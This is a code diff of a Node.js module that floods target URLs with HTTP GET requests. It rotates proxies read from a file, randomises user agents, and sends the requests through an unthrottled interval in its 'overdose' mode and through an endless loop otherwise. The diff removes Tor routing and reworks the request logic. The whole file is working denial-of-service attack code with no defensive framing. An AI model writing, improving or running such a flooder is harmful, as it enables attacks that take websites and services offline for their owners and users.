@@ -1,15 +1,13 @@
-const proxy =         require('tor-request');
-const request =       require('request');
-const fs =             require('fs').promises;
+const request =         require('request');
+const fs =              require('fs').promises;
 const randomUseragent = require('random-useragent');
 
-module.exports = async ({ urls, tor, setState }) => {
+module.exports = async ({ urls, overdose, setState }) => {
     let proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n');
 
     setInterval(async () => proxyList = (await fs.readFile('proxy.txt', 'utf8')).split('\n'), 60000);
 
-    const attack = (method, url, proxy) => {
-        try {
+    const getParams = (url, proxy = false) => {
             const params = {
                 url,
                 method: 'GET',
@@ -18,41 +16,62 @@ module.exports = async ({ urls, tor, setState }) => {
                 }
             };
     
-            if (proxy) params.proxy = `http://${proxy}`;
-    
-            return method(params, (err, res) => {
-                if (err) return setState({ url, success: 'unsuccessfully' });
-                if (res?.statusCode && res?.statusCode < 400) setState({ url, success: 'successfully' });
-            });
-        } catch(err) {
-            return setState({ url, success: 'unsuccessfully' });
-        }
+            if (proxy) params.proxy = proxy;
+
+            return params;
     }
     
-    if (tor) {
+    if (overdose) {
+        const attack = (url, proxy) => {
+            try {
+                request(getParams(url, proxy), (err, res) => {
+                    if (err) return setState({ url, success: 'unsuccessfully' });
+                    if (res?.statusCode && res?.statusCode < 400) return setState({ url, success: 'successfully' });
+                });
+            } catch(err) {
+                return setState({ url, success: 'unsuccessfully' });
+            }
+        }
+
         setInterval(() => {
             for (const url of urls) {
-                attack(proxy.request, url);
+                attack(url);
 
-                if (proxyList?.length) for (const proxy of proxyList) {
-                    attack(proxy.request, url, proxy);
-                }
-            };
-
-            return;
-        });
-    } else {
-        setInterval(() => {
-            for (const url of urls) {
-                attack(request, url);
-
-                if (proxyList?.length) for (const proxy of proxyList) {
-                    attack(request, url, proxy);
+                if (proxyList?.length) {
+                    for (const proxy of proxyList) {
+                        attack(url, proxy);
+                    }
                 }
             }
 
             return;
         });
+    } else {
+        const attack = (url, proxy) => {
+            try {
+                return new Promise((resolve) => {
+                    request(getParams(url, proxy), (err, res) => {
+                        if (err) setState({ url, success: 'unsuccessfully' });
+                        if (res?.statusCode && res?.statusCode < 400) setState({ url, success: 'successfully' });
+                        resolve();
+                    });
+                })
+            } catch(err) {
+                return setState({ url, success: 'unsuccessfully' });
+            }
+        }
+
+        while (true) {
+            for (const url of urls) {
+                await attack(url);
+
+                if (proxyList?.length) {
+                    for (const proxy of proxyList) {
+                        await attack(url, proxy);
+                    }
+                }
+            }
+        }
     }
 };
 
